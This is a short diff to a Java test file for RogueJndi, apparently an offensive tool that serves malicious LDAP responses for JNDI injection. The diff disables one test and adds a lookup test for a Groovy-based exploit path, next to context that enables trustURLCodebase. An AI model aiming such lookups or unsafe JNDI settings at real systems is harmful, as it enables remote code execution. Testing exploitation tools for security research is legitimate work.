@@ -22,6 +22,7 @@ public class RogueJndiTest {
         RogueJndi.main(new String[0]);
     }
 
+    @Ignore
     @Test
     public void reference() throws Exception {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
@@ -31,6 +32,11 @@ public class RogueJndiTest {
     @Test
     public void tomcat() throws Exception {
         testLookup("ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=tomcat");
+    }
+
+    @Test
+    public void groovy() throws Exception {
+        testLookup("ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=groovy");
     }
 
     @Ignore
